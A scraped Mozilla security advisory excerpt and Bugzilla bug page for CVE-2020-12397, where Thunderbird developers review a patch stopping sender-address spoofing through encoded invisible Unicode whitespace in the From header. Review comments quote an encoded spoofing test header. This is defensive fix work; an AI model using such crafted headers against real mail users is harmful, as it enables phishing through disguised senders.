* [Bug 1615471](https://bugzilla.mozilla.org/show_bug.cgi?id=1615471)

#### [#CVE-2020-12394: URL spoofing in location bar when unfocussed](#CVE-2020-12394)

Reporter
Kestrel
Impact
low
##### Description

A logic flaw in our location bar implementation could have allowed a local attacker to spoof the current location by selecting a different origin and removing focus from the input element.

##### References

* [Bug 1628288](https://bugzilla.mozilla.org/show_bug.cgi?id=1628288)

#### [#CVE-2020-12395: Memory safety bugs fixed in Firefox 76 and Firefox ESR 68.8](#CVE-2020-12395)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Alexandru Michis, Jason Kratzer, philipp, Ted Campbell, Bas Schouten, André Bargull, and Karl Tomlinson reported memory safety bugs present in Firefox 75 and Firefox ESR 68.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 76 and Firefox ESR 68.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1595886%2C1611482%2C1614704%2C1624098%2C1625749%2C1626382%2C1628076%2C1631508)

#### [#CVE-2020-12396: Memory safety bugs fixed in Firefox 76](#CVE-2020-12396)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers and community members Frederik Braun, Andrew McCreight, C.M.Chang, and Dan Minor reported memory safety bugs present in Firefox 75. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 76](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1339601%2C1611938%2C1620488%2C1622291%2C1627644)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_279d68b6_20250119_140528.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1617370)
* [XML](/show_bug.cgi?ctype=xml&id=1617370)

Closed
[Bug 1617370](/show_bug.cgi?id=1617370)
(CVE-2020-12397)

Opened 5 years ago
Closed 5 years ago

# Sender Email Address Spoofing by encoded extraneous white space in display name

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Sender Email Address Spoofing by encoded extraneous white space in display name

## Categories

### (Thunderbird :: Message Reader UI, defect)

[Product:](/describecomponents.cgi?product=Thunderbird)

Thunderbird
▾

Thunderbird
For bugs in MZLA's Thunderbird desktop mail client. Bugs in the back-end (e.g. protocols) should be filed in the [MailNews Core](https://bugzilla.mozilla.org/enter_bug.cgi?product=MailNews Core) product. Bugs in calendar should be filed in the [Calendar](https://bugzilla.mozilla.org/enter_bug.cgi?product=Calendar) product. Bugs for the chat features, file in the [Chat Core](https://bugzilla.mozilla.org/enter_bug.cgi?product=Chat%20Core) product.
[See Open Bugs in This Product](/buglist.cgi?product=Thunderbird&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Thunderbird)
Watch This Product

[Component:](/describecomponents.cgi?product=Thunderbird&component=Message%20Reader%20UI#Message%20Reader%20UI)

Message Reader UI
▾

Thunderbird :: Message Reader UI
The area that displays the header and body of the message, either in the 3-pane window or the standalone message window.
[See Open Bugs in This Component](/buglist.cgi?product=Thunderbird&component=Message%20Reader%20UI&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Thunderbird&component=Message%20Reader%20UI&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Thunderbird&component=Message%20Reader%20UI)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

60

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

All

All

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

## Tracking

### (thunderbird\_esr68+ fixed, thunderbird76+ affected, thunderbird77 fixed)

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

Thunderbird 77.0

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Accessibility Severity | --- |
| --- | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| thunderbird\_esr68 | [+](/buglist.cgi?f1=cf_tracking_thunderbird_esr68&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_thunderbird_esr68&o1=equals&v1=fixed) |
| thunderbird76 | [+](/buglist.cgi?f1=cf_tracking_thunderbird_76&o1=equals&v1=%2B) | [affected](/buglist.cgi?f1=cf_status_thunderbird_76&o1=equals&v1=affected) |
| thunderbird77 | --- | [fixed](/buglist.cgi?f1=cf_status_thunderbird_77&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-thunderbird |  | --- |
| thunderbird\_esr68 | + | fixed |
| thunderbird76 | + | affected |
| thunderbird77 |  | fixed |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| thunderbird133 | --- | --- |
| thunderbird134 | --- | --- |
| thunderbird135 | --- | --- |
| thunderbird136 | --- | --- |

## People

### (Reporter: mkmelin, Assigned: mkmelin)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=40)  [mkmelin](/user_profile?user_id=101158)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=40)  [mkmelin](/user_profile?user_id=101158)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

---

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

13 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[1506587](/show_bug.cgi?id=1506587 "RESOLVED FIXED - Sender Email Address Spoofing by extraneous white space in display name")

## Details

### (Keywords: csectype-spoof, sec-low)

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2020-12397

[Keywords:](/describekeywords.cgi)

[csectype-spoof](/buglist.cgi?keywords=csectype-spoof&resolution=---),
[sec-low](/buglist.cgi?keywords=sec-low&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

|  | wanted-thunderbird |  |
| --- | --- | --- |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (1 file, 1 obsolete file)

| [bug1617370\_spoof\_white\_encoded.patch](/attachment.cgi?id=9128371)  [5 years ago](#c2)  [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)   9.41 KB, patch | jorgk-bmo : [review-](#a91757_176914 "5 years ago") | [Details](/attachment.cgi?id=9128371&action=edit) | [Diff](/attachment.cgi?id=9128371&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1617370&attachment=9128371) |
| --- | --- | --- |
| [bug1617370\_spoof\_white\_encoded.patch](/attachment.cgi?id=9138509)  [5 years ago](#c9)  [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)   11.78 KB, patch | pmorris : [review+](#c10 "5 years ago")  wsmwk : [approval-comm-esr68+](#c19 "5 years ago") | [Details](/attachment.cgi?id=9138509&action=edit) | [Diff](/attachment.cgi?id=9138509&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1617370&attachment=9138509) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)  Assignee |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1617370#c0)• 5 years ago |
|  | |

+++ This bug was initially created as a clone of [Bug #1506587](/show_bug.cgi?id=1506587 "RESOLVED FIXED - Sender Email Address Spoofing by extraneous white space in display name") +++

By abusing Unicode whitespaces (e.g., U+3000) within the 'From:' email header, an attacker can spoof the sender email address when displayed by the Thunderbird mail client.

Turns out [bug 1506587](/show_bug.cgi?id=1506587 "RESOLVED FIXED - Sender Email Address Spoofing by extraneous white space in display name") didn't fix the case where the special characters are encoded.

Testcase in [attachment 9128245](/attachment.cgi?id=9128245 "testcase.eml") [[details]](/attachment.cgi?id=9128245&action=edit "testcase.eml").

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1617370#a45_101158)• 5 years ago |

Group: mail-core-security

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1617370#c1)• 5 years ago |
|  | |

Yes, I was wondering which code path RFC 2047 encoded tokens would take.

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)  Assignee |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1617370#c2)• 5 years ago |
|  | |

Attached patch

[bug1617370\_spoof\_white\_encoded.patch](attachment.cgi?id=9128371&action=diff) (obsolete)
— [Details](attachment.cgi?id=9128371&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1617370&attachment=9128371)

Try looks good: <https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&selectedJob=290046100>

[Attachment #9128371](/attachment.cgi?id=9128371&action=edit "bug1617370_spoof_white_encoded.patch") -
Flags: review?(kaie)

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1617370#a88004_101158)• 5 years ago |

Status: NEW → ASSIGNED

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1617370#c3)• 5 years ago |
|  | |

Comment on [attachment 9128371](/attachment.cgi?id=9128371 "bug1617370_spoof_white_encoded.patch") [[details]](/attachment.cgi?id=9128371&action=edit "bug1617370_spoof_white_encoded.patch") [[diff]](/attachment.cgi?id=9128371&action=diff "bug1617370_spoof_white_encoded.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1617370&attachment=9128371)
[bug1617370](/show_bug.cgi?id=1617370 "RESOLVED FIXED - Sender Email Address Spoofing by encoded extraneous white space in display name")\_spoof\_white\_encoded.patch
Review of [attachment 9128371](/attachment.cgi?id=9128371 "bug1617370_spoof_white_encoded.patch") [[details]](/attachment.cgi?id=9128371&action=edit "bug1617370_spoof_white_encoded.patch") [[diff]](/attachment.cgi?id=9128371&action=diff "bug1617370_spoof_white_encoded.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1617370&attachment=9128371):
-----------------------------------------------------------------
Have you checked linting? I see a eslint-enable complexity in the vicinity of the changes, perhaps that needs to move now.
::: mailnews/mime/jsmime/test/unit/test\_header.js
@@ +815,5 @@
> ],
> ],
> + // Collapse multiple "special" spaces like zero width spaces (\u200B)
> + // etc. also when encoded.
> + // This test case has invisible spaces both encoded and not.
Please expand on this comment as follows:
1) State the characters encoded in the base64 string. I tried decoding it at <https://www.base64decode.org/>, but from the result I can't see which invisible characters you used.
2) Please state that \u00A0 is a NBSP and \u2003 is an EM space
3) \u2003 is used in the code, but \u200B is used in the comment. Most likely you have the latter in the base64 string, but that's hard to tell.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1617370#c4)• 5 years ago |
|  | |

Actually,

YmzDtiA8aW52aXNpYmxlc3BhY2VAZnJpZW5kLmV4YW1wbGUuY29tPiAu decodes to `blö <invisiblespace@friend.example.com> .` and encoding that again I get

YmzDtiA8aW52aXNpYmxlc3BhY2VAZnJpZW5kLmV4YW1wbGUuY29tPiAu

So it seems to me that the comment is in fact incorrect and the RFC 2047 token doesn't contain invisible (zero width) spaces like \u200B. It's also not used outside the token so it appears that the test doesn't actually prove anything :-(

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1617370#a91757_176914)• 5 years ago |

[Attachment #9128371](/attachment.cgi?id=9128371&action=edit "bug1617370_spoof_white_encoded.patch") -
Flags: review-

|  | [Henri Sivonen (:hsivonen)](/user_profile?user_id=5490) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1617370#c5)• 5 years ago |
|  | |

jfkthame, is there a CSS property that can collapse sequences of space-like and default-ignorable characters to a single rendered space without modifying the DOM text node value?

Flags: needinfo?(jfkthame)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1617370#c6)• 5 years ago |
|  | |

I can't think of something in CSS that would do this... we have the [CSS white space processing](https://drafts.csswg.org/css-text-3/#white-space-processing) rules, but collapsing only applies to normal <space> (and <tab>) characters, not to what the spec calls "other space separators".

Flags: needinfo?(jfkthame)

|  | [0xsobky](/user_profile?user_id=619047) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1617370#c7)• 5 years ago |
|  | |

As a minor optimization to the patch, I think that `cleanToken()` shouldn't be invoked at all if the token only contains characters in the ASCII range `\x20-\x7E`. So only call `cleanToken(t.token)` if the following regex test `/[^\x20-\x7E]/.test(t.token)` returns true. There is no point cleaning the token if it doesn't contain any zero-width characters, especially that consecutive spaces are collapsed outside of the `cleanToken` function.

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1617370#a1115603_101158)• 5 years ago |

[Attachment #9128371](/attachment.cgi?id=9128371&action=edit "bug1617370_spoof_white_encoded.patch") -
Flags: review?(kaie)

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1617370#c8)• 5 years ago |
|  | |

I think for consistency it's just easier to to find-replace at once.

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)  Assignee |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1617370#c9)• 5 years ago |
|  | |

Attached patch

[bug1617370\_spoof\_white\_encoded.patch](attachment.cgi?id=9138509&action=diff)
— [Details](attachment.cgi?id=9138509&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1617370&attachment=9138509)

Adds some tests but other than that it's mostly moving the call to a better place.

There is one slight imperfection in the patch. For case D I replace with space, not remove. For some reason if i replace with "" throughout the process, somewhere, e.g. for zero width space the spaces surrounding it will also get completely removed. I haven't figured out exactly why, but it shouldn't matter in practice.

[Attachment #9128371](/attachment.cgi?id=9128371&action=edit "bug1617370_spoof_white_encoded.patch") -
Attachment is obsolete: true
[Attachment #9138509](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") -
Flags: review?(paul)

|  | [Paul Morris [:pmorris]](/user_profile?user_id=438347) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1617370#c10)• 5 years ago |
|  | |

Comment on [attachment 9138509](/attachment.cgi?id=9138509 "bug1617370_spoof_white_encoded.patch") [[details]](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") [[diff]](/attachment.cgi?id=9138509&action=diff "bug1617370_spoof_white_encoded.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1617370&attachment=9138509)
[bug1617370](/show_bug.cgi?id=1617370 "RESOLVED FIXED - Sender Email Address Spoofing by encoded extraneous white space in display name")\_spoof\_white\_encoded.patch
Review of [attachment 9138509](/attachment.cgi?id=9138509 "bug1617370_spoof_white_encoded.patch") [[details]](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") [[diff]](/attachment.cgi?id=9138509&action=diff "bug1617370_spoof_white_encoded.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1617370&attachment=9138509):
-----------------------------------------------------------------
Changes look good to me, with a few comments, nits addressed. It looks like Jorgk's concerns have been addressed. (Right?) The test\_header.js test passes locally with the patch applied.
::: mailnews/mime/jsmime/jsmime.js
@@ +330,5 @@
> /\*\*
> + \* Clean up characters that could cause display problems since they
> + \* are not displayed.
> + \* @param {string} token - The string to be cleaned.
> + \* @returns {string} the cleaned string.
nit: capitalize: the -> The ?
@@ +379,5 @@
> + // -- case D: /\p{Cf}/u
> + // <https://www.fileformat.info/info/unicode/category/Cf/list.htm>
> + // <https://mothereff.in/regexpu#input=/\p{Cf}/u&unicodePropertyEscape=1>
> + // Remove all of these except for \u0600-\u0605.
> + // XXX: We replace these with space, not empty space. Notably, for
Just to make this really clear, I'd say something like the following ("empty string" seems like a more common wording than "empty space"):
We replace these with spaces (" "), not empty strings ("").
@@ +1070,5 @@
> groupName = "";
> } else {
> // This is either comment content, a quoted-string, or some span of
> // dots and atoms.
> + token = cleanToken(token.toString());
Up to you, but I'd assign to a new variable like "tokenCleaned" rather than re-assign here. Especially in a long function like this it's harder to keep track of what's what, like whether "token" is cleaned yet or not.
[Attachment #9138509](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") -
Flags: review?(paul) → review+

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1617370#c11)• 5 years ago |
|  | |

Comment on [attachment 9138509](/attachment.cgi?id=9138509 "bug1617370_spoof_white_encoded.patch") [[details]](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") [[diff]](/attachment.cgi?id=9138509&action=diff "bug1617370_spoof_white_encoded.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1617370&attachment=9138509)
[bug1617370](/show_bug.cgi?id=1617370 "RESOLVED FIXED - Sender Email Address Spoofing by encoded extraneous white space in display name")\_spoof\_white\_encoded.patch
Review of [attachment 9138509](/attachment.cgi?id=9138509 "bug1617370_spoof_white_encoded.patch") [[details]](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") [[diff]](/attachment.cgi?id=9138509&action=diff "bug1617370_spoof_white_encoded.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1617370&attachment=9138509):
-----------------------------------------------------------------
Looks better, but still some mistakes.
::: mailnews/mime/jsmime/test/unit/test\_header.js
@@ +843,5 @@
> ],
> ],
> + // Collapse multiple consecutive "special" spaces, like zero width space
> + // etc.
> + // \u00A0 is soft hypen. \u200B is zero width space
That's a soft-hyphen? Isn't this a NBSP? I looked it up, soft-hyphen is U+00AD.
@@ +856,5 @@
> + ],
> +
> + // Collapse multiple consecutive "special" spaces, like zero width space
> + // etc. also when encoded.
> + // \u00A0 is soft hypen. \u200B is zero width space
And here.
@@ +858,5 @@
> + // Collapse multiple consecutive "special" spaces, like zero width space
> + // etc. also when encoded.
> + // \u00A0 is soft hypen. \u200B is zero width space
> + [
> + //"=?UTF-8?B?IMKgIGJsw7YgPGludmlzaWJsZXNwYWNlQGZyaWVuZC5leGFtcGxlLmNvbT4g4oCLIOKAiyDigIsu=?= <foe@example.com>"
This needs a comment. I'm not a great fan of this hacky UTF16 to UTF8 conversion, see [bug 1551746](/show_bug.cgi?id=1551746 "NEW - Replace use of escape() and unescape() in hacky UTF-8 <--> UTF-16 conversion").

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)  Assignee |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1617370#c12)• 5 years ago |
|  | |

<https://hg.mozilla.org/comm-central/rev/84249ce5084a8b7a0925b5d35c00331870a56a0c>

[status-thunderbird76](/buglist.cgi?f1=cf_status_thunderbird_76&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_thunderbird_76&o1=equals&v1=affected)
[status-thunderbird77](/buglist.cgi?f1=cf_status_thunderbird_77&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_thunderbird_77&o1=equals&v1=fixed)
[status-thunderbird\_esr68](/buglist.cgi?f1=cf_status_thunderbird_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_thunderbird_esr68&o1=equals&v1=affected)
[tracking-thunderbird76](/buglist.cgi?f1=cf_tracking_thunderbird_76&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_thunderbird_76&o1=equals&v1=%2B)
[tracking-thunderbird\_esr68](/buglist.cgi?f1=cf_tracking_thunderbird_esr68&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_thunderbird_esr68&o1=equals&v1=%2B)Target Milestone: --- → Thunderbird 77.0

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1617370#c13)• 5 years ago |
|  | |

Comment on [attachment 9138509](/attachment.cgi?id=9138509 "bug1617370_spoof_white_encoded.patch") [[details]](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") [[diff]](/attachment.cgi?id=9138509&action=diff "bug1617370_spoof_white_encoded.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1617370&attachment=9138509)
[bug1617370](/show_bug.cgi?id=1617370 "RESOLVED FIXED - Sender Email Address Spoofing by encoded extraneous white space in display name")\_spoof\_white\_encoded.patch
Sec issue.
[Attachment #9138509](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") -
Flags: approval-comm-esr68?
[Attachment #9138509](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") -
Flags: approval-comm-beta?

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1617370#c14)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1617370&comment_id=14745390 "1 revision") |
|  | |

The comment is incorrect :-( - Just proving the confusion.

```
+        // btoa takes a binary string to encode. unescape(encodeURIComponent(source))
+        // does UTF-8 to binary conversion. See bug 1551746 for other ways.

```

Correct is this:

unescape(encodeURIComponent(source)) encodes the JavaScript UTF-16 representation of the string into UTF-8.

And please lose the comment about btoa. It just takes some bytes, and bytes are always binary, in fact, everything is binary ;-)

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)  Assignee |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1617370#c15)• 5 years ago |
|  | |

Well it's from <https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/btoa>

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1617370#c16)• 5 years ago |
|  | |

Well, yes, btoa() takes some arbitrary binary data. I don't think the hint is useful since we all know that. But more importantly, the comment is totally wrong, since the aim is not UTF-8 to binary, whatever that might mean, but UTF-16 to UTF-8.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1617370#c17)• 5 years ago |
|  | |

<https://hg.mozilla.org/comm-central/rev/5a60280601f4f761896dc12d87c7e35c921c8fd2>

Follow-up: Correct comment. rs=comment-only DONTBUILD

|  | [Wayne Mery (:wsmwk)](/user_profile?user_id=29811) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1617370#c18)• 5 years ago |
|  | |

Comment on [attachment 9138509](/attachment.cgi?id=9138509 "bug1617370_spoof_white_encoded.patch") [[details]](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") [[diff]](/attachment.cgi?id=9138509&action=diff "bug1617370_spoof_white_encoded.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1617370&attachment=9138509)
[bug1617370](/show_bug.cgi?id=1617370 "RESOLVED FIXED - Sender Email Address Spoofing by encoded extraneous white space in display name")\_spoof\_white\_encoded.patch
Thanks for the tests
[Attachment #9138509](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") -
Flags: approval-comm-beta? → approval-comm-beta+

|  | [Wayne Mery (:wsmwk)](/user_profile?user_id=29811) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1617370#c19)• 5 years ago |
|  | |

Comment on [attachment 9138509](/attachment.cgi?id=9138509 "bug1617370_spoof_white_encoded.patch") [[details]](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") [[diff]](/attachment.cgi?id=9138509&action=diff "bug1617370_spoof_white_encoded.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1617370&attachment=9138509)
